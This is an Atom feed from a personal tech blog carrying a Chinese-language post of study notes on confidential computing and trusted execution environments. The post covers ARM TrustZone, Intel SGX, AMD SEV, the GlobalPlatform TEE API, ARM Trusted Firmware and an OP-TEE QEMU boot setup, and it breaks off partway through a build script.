<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SJTU-XHW&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/775cd43db6a8785d6a482dcf308b3be4</icon>
  <subtitle>It&#39;s better to burn out than to fade away.</subtitle>
  <link href="https://blog.sjtuxhw.top/atom.xml" rel="self"/>
  
  <link href="https://blog.sjtuxhw.top/"/>
  <updated>2025-04-17T15:53:43.512Z</updated>
  <id>https://blog.sjtuxhw.top/</id>
  
  <author>
    <name>SJTU-XHW</name>
    <email>sjtuxhw12345@sjtu.edu.cn</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>机密计算与TEE：知识整理和试验笔记</title>
    <link href="https://blog.sjtuxhw.top/technical/tee-lab/"/>
    <id>https://blog.sjtuxhw.top/technical/tee-lab/</id>
    <published>2025-04-17T15:31:36.000Z</published>
    <updated>2025-04-17T15:53:43.512Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Part-1-机密计算与-TEE-技术入门知识整理"><a href="#Part-1-机密计算与-TEE-技术入门知识整理" class="headerlink" title="Part 1. 机密计算与 TEE 技术入门知识整理"></a>Part 1. 机密计算与 TEE 技术入门知识整理</h2><p>本节参考文献参见 1.5 节。</p><h2 id="1-0-Background"><a href="#1-0-Background" class="headerlink" title="1.0 Background"></a>1.0 Background</h2><p>为了防止未经授权的访问，数据安全性是基于三种方面构建的，即静态存储数据、传输中数据、和使用中数据。</p><p>业界目睹了几项引人注目的内存抓取（例如 Target 信用卡和个人信息泄露事件）和 CPU 侧信道攻击，还有许多虚拟机管理程序（Hypervisor）漏洞也被报道出来，这些攻击和漏洞的报道显著提高了业界对  “使用中数据”的关注，另外，涉及恶意软件注入的著名攻击事件，例如 Triton 攻击和乌克兰电网袭击，更是使得保护“正在使用的数据”成为数据安全领域迫在眉睫的努力方向。</p><p>机密计算就是针对数据在使用过程中的安全问题所提出的一种解决方案。它是一种基于硬件的技术，将数据、特定功能、应用程序，同操作系统、系统管理程序或虚拟机管理器以及其他特定进程隔离开来，让数据存储在受信任的执行环境（TEE）中，即使是使用调试器，也无法从外部查看数据或者执行操作。TEE 确保只有经过授权的代码才能访问数据，如果代码被篡改，TEE 将阻止其继续进行操作。</p><h4 id="为什么机密计算需要以硬件为基础？"><a href="#为什么机密计算需要以硬件为基础？" class="headerlink" title="为什么机密计算需要以硬件为基础？"></a>为什么机密计算需要以硬件为基础？</h4><p>由于计算架构中任何层级中的安全性都可能因为基础层的漏洞而功亏一篑，任何计算层级的安全性取决在其之下层级的安全性。这个共识推动了对最低层安全解决方案的需求，直至硬件的硅组件。  </p><p>通过为最低层硬件提供安全性，最大程度降低了对整个计算架构参与方依赖性，可以从所需受信任方列表中删除操作系统和设备驱动程序供应商，平台和外围设备供应商以及服务提供商及其系统管理员，从而减少在系统生命周期中任何时刻遭受潜在危害的风险。</p><h2 id="1-1-Basic-Concepts"><a href="#1-1-Basic-Concepts" class="headerlink" title="1.1 Basic Concepts"></a>1.1 Basic Concepts</h2><p><img src="imgs/words.png" /></p><p>补充：GP，2010 年 7 月 GP（Global Platform，全球平台组织）提出了 TEE 可信执行环境的设计，他们设计的 API 被称为 GlobalPlatform API。该组织致力于跨行业协作，识别、开发和发布规范，以促进在安全芯片技术上安全且可互操作地部署和管理多个嵌入式应用程序。</p><p>先以 ARM 的 TrustZone 为例。随着智能手机的普及，手机上数据的价值越来越高，如电子支付密码（包括传统密码、指纹、人脸），带版权信息的数据等。为了进一步保护这些数据的安全，ARM 提出了 TrustZone 技术，其原理是将 CPU 的工作状态和其它相关硬件资源（中断、内存、外设和 cache 等）划分为安全（secure）和非安全（normal）两种类型，来达到数据隔离与保护。</p><blockquote><p>当 CPU 运行在 normal 状态时，将只能访问 non secure 空间的资源，而不能访问 secure 资源。当 CPU 运行在 secure 状态时，既能访问 non  secure 资源，也能访问 secure 资源；</p></blockquote><p>然后在 ARM 上，基于 Trustzone 技术实现了 TEE ，与之对应的是 REE，一般称 TEE 为 Secure World，REE 为 Normal World。OP-TEE（开源的 TEE OS）运行中 Secure World 里边，普通 OS（如 Linux，AOSP 等）运行在 Normal World 里边；</p><p><img src="imgs/tee-arch.png" width="450px" /></p><p>TEE 的特点：</p><ul><li>受硬件保护机制：TEE 隔离于 REE，只通过特定的入口于 TEE 通信，并不规定某一种硬件实现方法；</li><li>高性能：TEE 运行时使用 CPU 的全部性能；</li><li>快速通信机制：TEE 可以访问 REE 的内存，REE 无法访问受硬件保护的 TEE 内存；</li></ul><p>非安全操作系统在 TEE 规范中被称为富执行环境 (REE)。它通常是 Linux 操作系统的一个变种，例如 GNU/Linux 发行版或 AOSP。 </p><p>TEE 的设计在 ARM 架构上主要依靠 TrustZone 技术作为底层硬件隔离机制。然而，它的结构也使其能够与任何符合 TEE 概念和目标的隔离技术兼容，例如以虚拟机形式运行或在专用 CPU 上运行。</p><p>TEE 的主要设计目标是：</p><ul><li>隔离：TEE 提供与非安全操作系统的隔离，并使用底层硬件支持保护已加载的可信应用程序 (TA) 彼此隔离；</li><li>占用空间小：TEE 应保持足够小，以便驻留在合理数量的片上内存中，就像基于 ARM 的系统一样；</li><li>可移植性：TEE 旨在轻松插入到不同的架构和可用的硬件，并且必须支持各种设置，例如多个客户端操作系统或多个 TEE。</li></ul><p>研究者提供了三个类别用于比较不同的 TEE 实现，即<strong>功能性，安全性和可部署性</strong>：</p><ul><li><strong>功能标准</strong>：包括受保护的执行，密封存储，受保护的输入，受保护的输出和验证等环节，总体而言，这些标准衡量了整个使用周期中数据的物理保护，即接收，输入，处理，输出和验证；</li><li><strong>安全标准</strong>：包括数据隔离，信息流控制，清理，损害限制。此类别更侧重于避免对系统进行特定攻击的机制；</li><li><strong>可部署性</strong>：标准衡量了采用的障碍，包括对现有系统的支持，成本，开销和 SEE（Secure Execution Environment）性能；</li></ul><blockquote><p>由于功能和安全性标准之间存在一些重叠，只需要关注重点部分。</p></blockquote><h2 id="1-2-启动流程？"><a href="#1-2-启动流程？" class="headerlink" title="1.2 启动流程？"></a>1.2 启动流程？</h2><p>根据 GP 标准，TEE 的启动流程只在系统启动时执行一次，要求：</p><ul><li>启动流程至少建立一个信任根 (RoT)，需要一些机制和方法去实现；</li><li>一般情况下启动基于 ROM 代码：允许其他实现、依次验证加载的代码；</li><li>一般情况下 TEE 首先启动：阻止 REE 接口生效。 Trusted OS 首先启动，再启动 REE；</li></ul><h2 id="1-3-主流的基于硬件-TEE-技术"><a href="#1-3-主流的基于硬件-TEE-技术" class="headerlink" title="1.3 主流的基于硬件 TEE 技术"></a>1.3 主流的基于硬件 TEE 技术</h2><h3 id="1-3-1-ARM-TrustZone"><a href="#1-3-1-ARM-TrustZone" class="headerlink" title="1.3.1 ARM TrustZone"></a>1.3.1 ARM TrustZone</h3><p>架构：</p><ul><li>每个物理的处理器内核提供了两个虚拟内核：一个被认为是非安全的，被称为“非安全区”（Normal World），另一个被认为是安全的，被称为“安全区”（Secure World）；</li><li>以及一个在两者之间的上下文切换机制，称为监视模式（<code>EL3</code>）；</li><li>硬件支持：ARM-v8 本身支持名为 secure mode 的模式，用来区分 normal mode。通过设置 Secure Configuration Register 系统寄存器来使能该模式的支持，该寄存器的最后 1 bit 为 0 的话，则表示当前 CPU 处于为 secure mode（注意和特权级不一样）；</li></ul><p><img src="imgs/arm-secure-mode.jpg" width="450px" /></p><p>调用方式（最简单的情况下）：</p><p><img src="imgs/tee-call.png" width="450px" /></p><p>当非安全区的用户模式需要获取安全区的服务时，</p><ol><li>首先需要进入到非安全区的特权模式（Normal World 的 Rich OS 内核态）；</li><li>在该模式下调用 SMC（System Monitor  Call），处理器将进入到监视模式；</li><li>监视模式备份非安全区的上下文，然后进入到安全区的特权模式，此时的运行环境是安全区的执行环境；</li><li>此后进入到安全区的用户模式，执行相应的安全服务；</li><li>原路返回；</li></ol><p>上述 Normal World 和 Secure World 的区分可以是物理的，也可以是虚拟的。</p><p>物理和安全处理器以<strong><u>时间分割</u></strong>的方式共享物理处理器核心（分时复用？中断、调度是如何保证的？），这给了两个区域一个幻想，即它完全拥有处理器；</p><blockquote><p>这也给 Secure World 一个机会，使构建隔离的可编程环境成为可能，该环境可以运行各种安全应用程序。</p></blockquote><h3 id="1-3-2-Intel-SGX-Software-Guard-eXtensions"><a href="#1-3-2-Intel-SGX-Software-Guard-eXtensions" class="headerlink" title="1.3.2 Intel SGX (Software Guard eXtensions)"></a>1.3.2 Intel SGX (Software Guard eXtensions)</h3><ul><li><p>是对 Intel 架构的扩展。在原有架构上增加了一组新的指令集和内存访问机制；这些扩展允许应用程序实现一个被称为安全区（enclave）的容器，在应用程序的地址空间（用户态）中划分出一块被保护的区域，为容器内的代码和数据提供机密性和完整性的保护；</p></li><li><p>这块有限大小的加密内存区域称为 Enclave Page Cache（EPC），支持 32MB，64MB 或 128MB （SGX2 可支持 256MB）；</p></li><li><p>SGX 通过硬件访问控制机制来保护 Enclave 的内存。容器中的信息不会被特殊权限的恶意软件的破坏，即使底层的高特权系统软件（例如 OS 或虚拟机管理程序）是恶意的或已被破坏，SGX 仍可抵抗物理内存访问类的攻击；</p><ul><li>从外到内访问（非法）：Page Fault；</li><li>从内到外访问（合法）：由操作系统内存管理策略控制，而且 Enclave 只能在 Ring 3（用户态）请求系统调用；</li></ul></li><li><p>SGX 的实现需要处理器、内存管理部件、BIOS、驱动程序、运行时环境等软硬件协同完成。除了提供内存隔离与保护安全属性，SGX 架构还支持远程认证和密封的功能，可用于安全软件应用和交互协议的设计；</p></li><li><p>SGX 安全模型：</p><p><img src="imgs/intel-sgx.png" width="250px" /></p><ul><li><strong>可信计算基（Trusted Computing Base，TCB）</strong>被视为 CPU 组件，而系统的其他部分则被视为不可信任；</li><li>每个 SGX 应用程序至少包含两个不同的部分。 位于 Secure World 内部并在 Enclave Page Cache（EPC）中执行的受信任代码，以及位于不受信任的系统内存中并执行的不受信任的代码；</li><li>不可信任的部分创建 Enclave，并且定义 entry point，然后执行放置在 Enclave Page Cache 的、加密且受信任的内存中的 Secure World 程序；</li><li>Secure World 初始化后，不受信任的代码通过调用 <code>EENTER</code> 指令来调用 Enclave 代码，该指令将处理器模式从保护模式切换到安全区模式；然后处理器在 Enclave 内执行被调用的代码。调用 <code>EEXIT</code> 指令会导致 Enclave 内执行线程退出 Enclave，并且执行流程返回到不受信任的代码；</li></ul></li><li><p>除了用户创建的 Enclave 外，SGX 还使用了一些基础架构 Enclave（例如 Reference Enclave 和 Configuration Enclave）为本地或远程验证机制提供支持；</p></li><li><p>SGX 提供了一个可以保护静态 Enclave 数据的 Enclave 密封机制，可以在系统内存和 EPC 之间安全封送数据，并且使用硬件内存加密引擎（MEE）来对数据进行加密和解密。</p></li><li><p>SGX 支持 Enclave 内部的多线程处理：每个 APP 都可以有自己独立的 TEE，甚至可以创建多个 TEE Enclave；</p></li></ul><h3 id="1-3-3-AMD-SEV-Secure-Encrypted-Virtualization"><a href="#1-3-3-AMD-SEV-Secure-Encrypted-Virtualization" class="headerlink" title="1.3.3 AMD SEV (Secure Encrypted Virtualization)"></a>1.3.3 AMD SEV (Secure Encrypted Virtualization)</h3><ul><li><p>内存加密方案。对整个操作系统进行内存加密，操作系统本身在 TCB（Trust Computing Base）中。可以防止通过总线/ DRAM 遭受物理攻击；</p></li><li><p>通过提供加密的 VM 隔离来解决高特权系统软件类别的攻击，每个虚拟机使用一个密钥隔离客户机系统和虚拟机管理程序；</p></li><li><p>密钥由 AMD 安全处理器生成和管理，内存控制器中嵌入了AES-128 加密引擎。 提供适当的密钥后，将自动对主存储器（memory）中的数据进行加密和解密；</p></li><li><p>系统管理程序（Hypervisor）更改通过使用硬件虚拟化指令以及与 AMD 安全处理器的通信来管理内存控制器中相应的密钥。也就是说<strong><u>系统组件（比如系统管理程序）试图读取客户机的内存时，只能看到被加密后的字节</u></strong>；</p></li><li><p>AMD SEV VM 使用客户机中页表中的加密比特 C 来控制一个内存页是私密的还是共享的，比特 C 的位置有具体实现定义，可以是物理地址的最高位。</p><ul><li><p>VM 标记共享（非加密）内存页时，C bit = 0，表明不必使用该 VM 的内存加密密钥对其加密；</p></li><li><p>私密（加密）内存页只能用于 VM，标记 C bit = 1。一个典型的 VM 中，大多数内存页被标记为私密的，只有那些与外部通信的内存页才会标记为共享的；</p><p><img src="imgs/amd-sev.jpg" width="550px" /></p></li></ul></li><li><p>2017 年 AMD 又引入了 SEV-ES（Encrypted State）增加了对 CPU 寄存器状态的保护，当 VM 停止运行时，将加密所有 CPU 寄存器的内容；</p><blockquote><p>这样可以防止将 CPU 寄存器中的信息泄露给虚拟机管理程序之类的组件，甚至可以检测到对 CPU 寄存器状态的恶意修改。</p></blockquote></li><li><p>AMD 又推出了 SEV-SNP。其建立在原始的 AMD SEV 和 SEV-ES 的基础上，可提供额外的基于硬件的内存完整性保护，以抵御基于管理程序的攻击，比如：数据回放、内存重新映射等。</p><ul><li>基本原理：如果 VM 能够读取内存的私有（加密）页面，则在它下次操作前必须始终只能读到最后一次写入的值。这意味着，如果 VM 将值 A 写入内存位置 X ，每当以后读取 X 时，它要么必须看到值 A，要么必须得到一个异常，指示无法读取内存。</li></ul></li><li><p>该方案多用于云中的应用，可保护数据免受 CSP（Cloud Solution Provider）的侵害；</p></li></ul><h3 id="1-3-4-Apple-SEP-Secure-Enclave-Processor"><a href="#1-3-4-Apple-SEP-Secure-Enclave-Processor" class="headerlink" title="1.3.4 Apple SEP (Secure Enclave Processor)"></a>1.3.4 Apple SEP (Secure Enclave Processor)</h3><ul><li><p>使用一个独立于主处理器外的安全协处理器，其中包括基于硬件的密钥管理器，可提供额外的安全性保护。</p><ul><li>安全隔离区处理器是在片上系统（SoC）内制造的协处理器；它使用加密的内存，并包括一个硬件随机数生成器；</li><li>安全协处理器提供了用于数据保护密钥管理的所有加密操作，即使内核受到威胁，也可以维护数据保护的完整性；</li></ul><p><img src="imgs/apple-sep.jpg" width="450px" /></p></li><li><p>安全隔区是集成到 Apple 片上系统 (SoC) 的专用安全子系统，由安全隔区处理器提供主要计算能力；</p></li><li><p>安全隔区与应用程序处理器之间的通信受到严格的控制：将其隔离到一个中断驱动的邮箱以及共享的内存数据缓冲区；</p></li><li><p>安全隔区包括一个专用的安全隔区 Boot ROM。与应用程序处理器 Boot ROM 类似，安全隔区 Boot ROM 也是不可更改的代码，用于为安全隔区建立硬件信任根；</p></li></ul><h3 id="1-3-5-小结"><a href="#1-3-5-小结" class="headerlink" title="1.3.5 小结"></a>1.3.5 小结</h3><ul><li><p>ARM TrustZone，利用硬件监督模式（<code>EL3</code>），使用指令或中断在同一处理器上的执行环境之间切换，像更高一级 “OS” 在 Secure World（Rich OS）和 Normal World（TEE OS）间调度和切换；</p></li><li><p>Intel SGX，用户态安全 Enclave，对特定区域的内存进行加密保护，在一个用户态进程内形成安全容器，对其中从 RAM 进出的内存数据进行加密，TCB 的规模最小（只有硬件和这个 Enclave），可以使用原本的系统调用（因为用户态），初始代码是从普通空间复制而来，不是加密信息；</p><blockquote><p>这个方案只有远程校验才能从外部加载/存储密钥；</p></blockquote></li><li><p>AMD SEV，对整个 OS 内存加密，OS 本身就在 TCB 中，可以防止通过总线/ DRAM 遭受物理攻击，当客户机从租户获得密钥时，加密可以扩展到虚拟化环境；</p></li><li><p>Apple SEP，使用协处理器方案，即芯片组或 SoC 中内置协处理器，内部带有单独的操作系统和应用程序，应用通过安全信道与外部通信，通常包括加密引擎；</p></li></ul><h2 id="1-4-GP-API"><a href="#1-4-GP-API" class="headerlink" title="1.4 GP API"></a>1.4 GP API</h2><p>GlobalPlatform 组织提供的 TEE API 规定了大多数适用场景所需的方法。一般情况下，REE 侧构成：</p><ul><li>CA（Client APP）对应一些上层应用，比如指纹采集、支付应用等，通过调用 TEE Client API 实现与 TEE 环境的交互；</li><li>REE Communication Agent 为 TA 和 CA 之间的消息传递提供了 REE 支持；</li><li>TEE Client API 是 REE 中的 TEE 驱动程序提供给外部的接口，可以使运行在 REE 中的 CA 能够与运行在 TEE 中的 TA 交换数据。</li></ul><p>TEE 侧构成：</p><ul><li>TA（Trusted  Application）是 TEE 中完成特定功能的应用；</li><li>TEE Communication Agent 是可信操作系统的特殊组成部分，它与 REE Communication Agent 一起工作，使 TA 与 CA 之间安全地传输消息；</li><li>TEE Internal Core API 是 TEE 操作系统提供给 TA 调用的内部接口，包括密码学算法，内存管理等功能；</li><li>Trusted Device Drivers 可信设备驱动程序，为专用于 TEE 的可信外设提供通信接口；</li><li>Shared Memory 是一块只有 CA 和 TA 可以访问的一块安全内存，CA 和 TA 通过共享内存来快速有效传输指令和数据；</li></ul><p>CA 常用接口：</p><ul><li><code>TEEC_InitializeContext</code>：对变量 Context 进行初始化配置，用来建立 CA 和 TEE 的联系，向 TEE 申请共享内存地址用于存放数据；</li><li><code>TEEC_OpenSession</code>：建立一个 CA 和 TA 间的 session，用于 CA 和 UUID 指定的 TA 进行通信，是 CA 连接 TA 的起始点；</li><li><code>TEEC_InvokeCommand</code>：依靠打开的 session，将传送命令请求给 TA，并将必要的指令执行参数一并发送给 TA；</li><li><code>TEEC_CloseSession</code>：关闭 session，关闭 CA 和 TA 之间的通道；</li><li><code>TEEC_FinalizeContext</code>：释放 Context，结束 CA 与 TEE 的连接；</li></ul><p>TA 接口：</p><ul><li><code>TA_CreateEntryPoint/TA_DestroyEntryPoint</code>：为 CA 建立/移除接入点，注册/取消 TA 的服务；</li><li><code>TA_OpenSessionEntryPoint/TA_CloseSessionEntryPoint</code>：建立/关闭 CA 与 TA 之间的通讯通道；</li><li><code>TA_InvokeCommandEntryPoint</code>：接收 CA 传送的指令和参数，并在这 TEE 侧执行；</li></ul><p><img src="imgs/tee-routine.png" width="450px" /></p><h2 id="1-5-本部分参考文献"><a href="#1-5-本部分参考文献" class="headerlink" title="1.5 本部分参考文献"></a>1.5 本部分参考文献</h2><ul><li><a href="https://optee.readthedocs.io/en/latest/">Optee Doc</a>；</li><li><a href="https://blog.csdn.net/feelabclihu/article/details/128157100">TEE SMC 理解 - CSDN</a>；</li><li><a href="https://zhuanlan.zhihu.com/p/401632688">浅谈基于硬件TEE的技术方案 - 知乎</a>；</li><li><a href="https://www.jianshu.com/p/929d806f7caf">TEE和MesaTEE - 简书</a>；</li><li><a href="https://kickstartembedded.com/2022/11/07/op-tee-part-3-setting-up-op-tee-on-qemu-raspberry-pi-3/">OP-TEE: Part 3 – Setting up OP-TEE on QEMU &amp; Raspberry Pi 3</a>；</li><li><a href="https://cs.brown.edu/courses/csci2390/2019/notes/s18-ryoan.pdf">TEE Thread Model - CS BROWN EDU</a>；</li></ul><h2 id="Part-2-TEE-的-OS-移植笔记-ARM"><a href="#Part-2-TEE-的-OS-移植笔记-ARM" class="headerlink" title="Part 2. TEE 的 OS 移植笔记 (ARM)"></a>Part 2. TEE 的 OS 移植笔记 (ARM)</h2><h2 id="2-1-Revisit-ARM-TrustZone"><a href="#2-1-Revisit-ARM-TrustZone" class="headerlink" title="2.1 Revisit: ARM TrustZone"></a>2.1 Revisit: ARM TrustZone</h2><h3 id="2-1-1-Basic-Settings"><a href="#2-1-1-Basic-Settings" class="headerlink" title="2.1.1 Basic Settings"></a>2.1.1 Basic Settings</h3><p>ARM 从 ARMv6 的架构开始引入了 TrustZone 技术。</p><p> TrustZone 在硬件层面，借助 Secure Configuration Register（SCR）将 CPU 的工作状态分为了<strong>正常世界状态 （Normal World Status，NWS）和安全世界状态 （Secure World Status，SWS）</strong>。</p><blockquote><p>CPU 在访问安全设备或者安全内存地址空间时，芯片级别的安全扩展组件会去<strong>校验 CPU 发送的访问请求的安全状态读写信号位</strong>（Non-secure bit，NS bit）是 0 还是 1，以此来判定当前 CPU 发送的资源访问请求是安全请求还是非安全请求。</p><p>而处于非安全状态的 CPU 将访问指令发送到系统总线上时，其访问请求的安全状态读写信号位都会被强制设置成 1，表示当前 CPU 的访问请求为非安全请求。</p><p>而非安全请求试图去访问安全资源时会被安全扩展组件认为是非法访问的，于是就禁止其访问安全资源，因此该 CPU 访问请求的返回结果要么是访问失败，要么就是返回无效结果，这也就实现了对系统资源硬件级别的安全隔离和保护。</p></blockquote><p>支持 TrustZone 的芯片提供了对外围硬件资源的硬件级别的保护和安全隔离。当 CPU 处于正常世界状态时，任何应用（包括 Rich OS）都无法访问安全硬件设备，也无法访问属于安全世界状态下的内存、缓存（Cache）以及其他外围安全硬件设备。总的来说，TrustZone 需要起到以下作用：</p><ul><li>隔离功能（安全状态和非安全状态）；</li><li>外设和内存 （物理上分开）；</li><li>总线请求；</li></ul><p>这是一个支持 TZ 的 SoC：</p><p><img src="imgs/arm-tz-soc.png" width="650px" /></p><p>TEE 支持基于 TrustZone 提供可信运行环境，为开发人员提供了 API，以方便他们开发实际应用程序。</p><p>在实际应用时，可以将用户的敏感数据保存到 TEE 中，并由可信应用（TA）使用重要算法和处理逻辑来完成对数据的处理。当需要使用用户的敏感数据做身份验证时，则通过在 REE 侧定义具体的请求编号（ID）从 TEE  侧获取验证结果。验证的整个过程中用户的敏感数据始终处于 TEE 中，REE 侧无法查看到任何 TEE 中的数据。对于 REE 而言，TEE 中的 TA 相当于一个黑盒，只会接受有限且提前定义好的合法调用（TEEC），而至于这些合法调用到底是什么作用，会使用哪些数据，做哪些操作在 REE 侧是无法知晓的。如果在 REE 侧发送的调用请求是非法请求，TEE 内的 TA 是不会有任何的响应或是仅返回错误代码，并不会暴露任何数据给 REE 侧。</p><p>TEE 的系统配置、内部逻辑、安全设备和安全资源的划分是与 CPU 的集成电路设计紧密挂钩的，<strong>使用 ARM 架构设计的不同 CPU，TEE 的配置完全不一样</strong>。国内外针对不同领域的 CPU 也具有不同的 TEE 解决方案。</p><p>这里我想选择开源的 OPTEE 来进行移植，因为它文档支持丰富、提供了完整的 SDK、遵循 GP API。</p><h3 id="2-1-2-ARM-v8-的-TrustZone"><a href="#2-1-2-ARM-v8-的-TrustZone" class="headerlink" title="2.1.2 ARM-v8 的 TrustZone"></a>2.1.2 ARM-v8 的 TrustZone</h3><h3 id="2-1-3-总线安全扩展"><a href="#2-1-3-总线安全扩展" class="headerlink" title="2.1.3 总线安全扩展"></a>2.1.3 总线安全扩展</h3><h3 id="2-1-4-TrustZone-中断控制"><a href="#2-1-4-TrustZone-中断控制" class="headerlink" title="2.1.4 TrustZone 中断控制"></a>2.1.4 TrustZone 中断控制</h3><h3 id="2-1-5-MMU-安全扩展"><a href="#2-1-5-MMU-安全扩展" class="headerlink" title="2.1.5 MMU 安全扩展"></a>2.1.5 MMU 安全扩展</h3><h3 id="2-1-6-Cache-amp-TLB-安全扩展"><a href="#2-1-6-Cache-amp-TLB-安全扩展" class="headerlink" title="2.1.6 Cache &amp; TLB 安全扩展"></a>2.1.6 Cache &amp; TLB 安全扩展</h3><p>TODO</p><h2 id="2-2-ARM-Trusted-Firmware"><a href="#2-2-ARM-Trusted-Firmware" class="headerlink" title="2.2 ARM Trusted Firmware"></a>2.2 ARM Trusted Firmware</h2><h3 id="2-2-1-Concepts"><a href="#2-2-1-Concepts" class="headerlink" title="2.2.1 Concepts"></a>2.2.1 Concepts</h3><p>ARM可信任固件（ARM Trusted Firmware，ATF）是由 ARM 官方提供的底层固件，该固件统一 了 ARM 底层接口标准，如电源状态控制接口（Power Status Control Interface，PSCI）、安全启 动需求（Trusted Board Boot Requirements， TBBR）、安全世界状态（SWS）与正常世界状态（NWS）切换的安全监控模式调用（SMC）操作等。ATF 旨在将 ARM 底层的操作统一使代码能够重用和便于移植。</p><h3 id="2-2-2-ATF-主要功能"><a href="#2-2-2-ATF-主要功能" class="headerlink" title="2.2.2 ATF 主要功能"></a>2.2.2 ATF 主要功能</h3><p>ATF 的源代码共分为 bl1、bl2、bl31、bl32、bl33 部分，其中：</p><ul><li>bl1、bl2、bl31 部分属于固定的固件；</li><li>bl32 和 bl33 分别用于加载 TEE OS 和 REE 侧的镜像；整个加载过程可配置成安全启动的方式，每一个镜像文件在被加载之前都会验证镜像文件的电子签名是否合法；</li><li>bl31 任务是接受 TEE OS 注册的服务入口点，并负责完成安全世界状态和正常世界状态之间的切换；</li></ul><p>ATF主要完成的功能如下：</p><ul><li><p>配置和初始化：</p><ul><li><p>初始化 Secure World 状态运行环境、异常向量、 控制寄存器、中断控制器、配置平台的中断。</p></li><li><p>初始化 ARM 通用中断控制器（General Interrupt Controller，GIC）2.0 版本和 3.0 版本的驱动初始化。</p></li><li><p>执行 ARM 系统 IP 的标准初始化操作以及安全扩展组件的基本配置。</p></li></ul></li><li><p>安全监控模式调用（Secure Monitor Call， SMC）请求的逻辑处理代码（Monitor 模式 / EL3）。</p></li><li>实现可信板级引导功能，对引导过程中加载的镜像文件进行电子签名检查。</li><li>支持自有固件的引导，开发者可根据具体需求将自有固件添加到 ATF 的引导流程中。</li></ul><p><img src="imgs/atf-arch.png" width="650px" /></p><p>其中：</p><ul><li><p>SMC Dispatcher：处理非安全世界的 SMC 请求，决定哪些 SMC 由 Trusted Firmware 在 EL3 处理，哪些转发给 TEE 进行处理；</p></li><li><p>Trusted Firmware 处理 PSCI 任务、或者 SoC 相关工作，例如一个播放 DRM Video 的调用情况：</p><p><img src="imgs/atf-call-eg.png" width="650px" /></p><ol><li>调用相关 CA，使用 <code>libDRM.so</code>；</li><li>库调用 TrustZone Driver 向 Secure World 中的 TA 发起请求，同时将相关信息传递到 shared message buffer（非安全）中；</li><li>SMC 进入 Secure World 的 TEE OS 后，从 message buffer 中获取相关信息并：<ul><li><strong>Trusting the message</strong>：由于 message 是不可信的，所以 secure world 需要对这些内容进行一些认证；</li><li><strong>Scheduling</strong>：对于 PSCI 类型快速处理并且不频繁请求，进入 EL3 处理完后退出到非安全状态。对于一些需要 TEE OS 处理的任务，不能被非安全中断打断，避免造成安全服务不可用；</li></ul></li></ol></li><li><p>以 OPTEE 为例，更细致一点：</p><p><img src="imgs/arm64-tz-components.png" width="450px" /></p><ul><li><p>CA 一般不直接使用 TEE Client API，而是使用中间 Service API 提供的服务，TEE Client API 再调用 OP-TEE Driver（暴露在设备文件系统 <code>/dev/tee0</code>），完成后续动作；</p></li><li><p>TEE Supplicant 为 TEE Daemon，有权使用 <code>/dev/teepriv0</code> 设备，在 OP-TEE 驱动的<u>挂载过程中</u>会建立正常世界状态与安全世界状态之间的共享内存，用于 OP-TEE Driver 与 OP-TEE 之间的数据共享；同时还会创建两个链表，分别用于保存来自 OP-TEE 的 RPC 请求和发送 RPC 请求的处理结果给 OP-TEE；</p><blockquote><p><strong>来自 OP-TEE 的 RPC 请求主要包括 socket 操作、REE 侧文件系统操作、加载 TA 镜像文件、数据库操作、共享内存分配和注册操作等</strong>。</p></blockquote><ul><li>该进程在 Linux 系统启动过程中被自动创建，在编译时，该进程的启动信息会被写入到 <code>/etc/init.d</code> 文件中，而该进程的可执行文件则被保存在文件系统的 <code>bin</code> 目录下；</li><li>该进程中会使用一个 loop 循环接收来自 OP-TEE 的 RPC 请求，且每次获取到来自 OP-TEE 的 RPC 请求后都会自动创建一个线程，用于接收 OP-TEE 驱动队列中来自 OP-TEE 的 RPC 请求信息，之所以这么做是因为时刻需要保证在 REE 侧有一个线程来接收 OP-TEE 的请求，实现 RPC 请求的并发处理；</li></ul></li></ul></li></ul><h3 id="2-2-3-Targets"><a href="#2-2-3-Targets" class="headerlink" title="2.2.3 Targets"></a>2.2.3 Targets</h3><p>现在我们就明白了，如果我们想把 TEE 功能移植到一个 ARM OS 上（例如 ChCore，OpenHarmony EduDist），需要集齐下面的组件：</p><ul><li>Normal World 状态的客户端库（提供给 CA 使用的 <code>libteec</code>）；</li><li>Normal World 状态的可信驱动（给 Rich OS Kernel 使用的驱动，用以发起 SMC 等操作）；</li><li>Secure World 的可信内核系统及配套的可信硬件驱动（TEE OS &amp; Secure Driver）；</li><li>安全世界状态的可信应用库（<code>libutee</code>）；</li><li>ATF 固件（应配置启动参数）；</li></ul><h2 id="2-3-OPTEE-启动过程试验"><a href="#2-3-OPTEE-启动过程试验" class="headerlink" title="2.3 OPTEE + 启动过程试验"></a>2.3 OPTEE + 启动过程试验</h2><h3 id="2-3-1-基于-QEMU-的-OPTEE-启动过程"><a href="#2-3-1-基于-QEMU-的-OPTEE-启动过程" class="headerlink" title="2.3.1 基于 QEMU 的 OPTEE 启动过程"></a>2.3.1 基于 QEMU 的 OPTEE 启动过程</h3><p>观察编译后的二进制目录：</p><p><img src="imgs/optee-build-dir.png" width="650px" /></p><ul><li><p>Linux (Rich OS) 镜像以及根文件系统：</p><ul><li><p>Image、linux.bin、uImage（u-boot wrapper 的 Image）；</p></li><li><p>rootfs.cpio.gz；</p></li></ul></li><li><p>ATF 固件（with OPTEE OS configurations）以及 u-boot；</p></li></ul><p>在 OPTEE 官方提供的启动脚本中，入口 BIOS 为 <code>bl1.bin</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">run-only:</span><br><span class="line">    <span class="built_in">ln</span> -sf $(ROOT)/out-br/images/rootfs.cpio.gz $(BINARIES_PATH)/</span><br><span class="line">    $(call check-terminal)</span><br><span class="line">    $(call run-help)</span><br><span class="line">    $(call launch-terminal,54320,<span class="string">&quot;Normal World&quot;</span>)</span><br><span class="line">    $(call 